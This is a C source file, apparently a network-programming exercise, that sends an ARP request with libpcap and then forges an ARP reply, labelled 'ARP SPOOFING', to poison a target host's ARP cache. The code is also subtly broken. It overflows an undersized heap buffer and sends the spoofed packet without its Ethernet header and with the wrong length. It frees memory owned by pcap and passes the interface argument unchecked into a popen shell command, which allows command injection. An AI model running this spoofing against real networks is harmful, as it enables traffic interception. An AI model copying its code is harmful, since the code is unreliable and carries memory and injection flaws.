#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <net/ethernet.h>

#define REQUEST 0x0001
#define REPLY 0x0002

struct eth_header {
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
};

struct arp_packet {
	uint16_t hw_type;
	uint16_t protocol;
	uint8_t hw_addr_len;
	uint8_t protocol_addr_len;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip;
	uint8_t target_mac[6];
	uint32_t target_ip;
};

void init(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
	eth_hdr->type = htons(0x0806);
	arp_pk->hw_type = htons(0x0001);
	arp_pk->protocol = htons(0x0800);
	arp_pk->hw_addr_len = 0x06;
	arp_pk->protocol_addr_len = 0x04;
	for (int i=0; i<6; i++) {
		eth_hdr->dest_mac[i] = 0xff;
		arp_pk->target_mac[i] = 0x00;
	}
	arp_pk->opcode = htons(REQUEST);
}

void print_packet(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
	printf("ARP PACKET SIZE: %d\n", sizeof(*arp_pk));
	printf("---------------------------------------------------\n");
	printf("ether_src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 eth_hdr->src_mac[0], eth_hdr->src_mac[1], eth_hdr->src_mac[2],
 eth_hdr->src_mac[3], eth_hdr->src_mac[4], eth_hdr->src_mac[5]);
	printf("ether_dest_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 eth_hdr->dest_mac[0], eth_hdr->dest_mac[1], eth_hdr->dest_mac[2],
 eth_hdr->dest_mac[3], eth_hdr->dest_mac[4], eth_hdr->dest_mac[5]);
	printf("ethernet type: %04x\n", eth_hdr->type);
	printf("---------------------------------------------------\n");
	printf("hw_type: %04x\n", arp_pk->hw_type);
	printf("protocol: %04x\n", arp_pk->protocol);
	printf("hw_addr_len: %02x\n", arp_pk->hw_addr_len);
	printf("protocol_addr_len: %02x\n", arp_pk->protocol_addr_len);
	printf("sender_ip: %x\n", arp_pk->sender_ip);
	printf("target_ip: %x\n", arp_pk->target_ip);
	printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 arp_pk->sender_mac[0], arp_pk->sender_mac[1], arp_pk->sender_mac[2],
 arp_pk->sender_mac[3], arp_pk->sender_mac[4], arp_pk->sender_mac[5]);
	printf("target_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 arp_pk->target_mac[0], arp_pk->target_mac[1], arp_pk->target_mac[2],
 arp_pk->target_mac[3], arp_pk->target_mac[4], arp_pk->target_mac[5]);
	printf("---------------------------------------------------\n");
}

int getSourceMac(char* interface, uint8_t* res) {
	FILE *fp;
	char my_mac[18];
	char cmd1[128] = "ip link show ";
	char *cmd2 = " | grep ether | awk '{print $2}'";

	strcat(cmd1, interface);
	strcat(cmd1, cmd2);
	fp = popen(cmd1, "r");
	if (NULL == fgets(my_mac, sizeof(my_mac), fp)) {
		return -1;
	}

	for (int i=0, j=0; i < 18 && j < 6; i++,j++) {
		uint8_t tmp1, tmp2;
		if (my_mac[i] >= 'a' && my_mac[i] <= 'f') 
			tmp1 = my_mac[i]-'a'+10;
		else if (my_mac[i] >= '0' && my_mac[i] <= '9')
			tmp1 = my_mac[i]-'0';
		else tmp1 = 0;
		i++;
		if (my_mac[i] >= 'a' && my_mac[i] <= 'f')
			tmp2 = my_mac[i]-'a'+10;
		else if (my_mac[i] >= '0' && my_mac[i] <= '9')
			tmp2 = my_mac[i]-'0'+0;
		else tmp2 = 0;
		i++;
		res[j] = (tmp1 << 4) | tmp2;
	}
	return 0;
}

uint32_t my_inet_aton(char* strIP) {
	uint32_t tmp[4] = { 0, 0, 0, 0 };
	for (int i=strlen(strIP)-1, cipher=1, j=0; i >= 0; i--) {
		if (strIP[i] == '.') {
			cipher = 1;
			j++;
			continue;
		}
		tmp[j] += (strIP[i]-'0')*cipher;
		cipher *= 10;
	}
	printf("ip: %d.%d.%d.%d\n", tmp[0], tmp[1], tmp[2], tmp[3]);
	tmp[0] <<= 24;
	tmp[1] <<= 16;
	tmp[2] <<= 8;
	printf("%04x\n", (tmp[0] | tmp[1] | tmp[2] | tmp[3]));
	return (tmp[0] | tmp[1] | tmp[2] | tmp[3]);
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		printf("Usage: ./send_arp <interface> <sender ip> <target ip>\n");
		return -1;
	}
	struct eth_header *eth_hdr = (struct eth_header*) malloc(sizeof(struct eth_header));
	struct arp_packet *arp_pk = (struct arp_packet*) malloc(sizeof(struct arp_packet));
	
	uint32_t sip = my_inet_aton(argv[2]);
	uint32_t dip = my_inet_aton(argv[3]);
	uint8_t smac[6], dmac[6];
	if (getSourceMac(argv[1], smac) == -1) {
		return -1;
	}

	for (int i=0; i<6; i++) 
		eth_hdr->src_mac[i] = arp_pk->sender_mac[i] = smac[i];
	arp_pk->sender_ip = sip;
	arp_pk->target_ip = dip;
	init(eth_hdr, arp_pk);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	print_packet(eth_hdr, arp_pk);
	int total_size = sizeof(*eth_hdr) + sizeof(*arp_pk);
	u_char* packet = (u_char*) malloc(sizeof(total_size));
	memcpy(packet, eth_hdr, sizeof(*eth_hdr));
	memcpy(packet+14, arp_pk, sizeof(*arp_pk));
	printf("PACKET INFO\n");
	for (int i=0; i<total_size; i++)
		printf("%02x", packet[i]);
	printf("\n");
	if (pcap_sendpacket(handle, packet, total_size) == -1) {
		printf("Send failure\n");
		return -1;
	}

	struct pcap_pkthdr *header;
	memset(packet, 0, sizeof(total_size));
	int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
	printf("res:%d\n", res);
	if (res <= 0) return -1;
	struct eth_header* recv_eth_hdr;
	struct arp_packet* recv_arp_pk;
	recv_eth_hdr = (struct eth_header*) packet;
	recv_arp_pk = (struct arp_packet*) (packet + 14);
	printf("RECEIVE\n");
	print_packet(recv_eth_hdr, recv_arp_pk);

	if (ntohs(recv_eth_hdr->type) == 0x0806) {
		if (ntohs(recv_arp_pk->protocol) == 0x0800) {
			if (ntohs(recv_arp_pk->opcode) == REPLY && recv_arp_pk->target_ip == sip) {
				printf("Get ARP Reply packet!\n");
				printf("TARGET MAC  ");
				for(int i=0; i<5; i++) printf("%02x: ", recv_eth_hdr->dest_mac[i]);
				printf("%02x\n", recv_eth_hdr->dest_mac[5]);
				printf("TARGET IP   %04x\n", recv_arp_pk->sender_ip);

				printf("2) ARP SPOOFING\n");
				arp_pk->opcode = htons(REPLY);
				arp_pk->sender_ip = my_inet_aton("123.123.123.123");
				arp_pk->target_ip = recv_arp_pk->sender_ip;
				for (int i=0; i<6; i++) arp_pk->sender_mac[i] = 0x11;
				for (int i=0; i<6; i++) arp_pk->target_mac[i] = eth_hdr->dest_mac[i];
				pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));
				printf("---------------------------------------------------------\nSEND PACKET\n");
			}
		}
	}

	free(eth_hdr);
	free(arp_pk);
	free(packet);
	pcap_close(handle);
	return 0; 
}
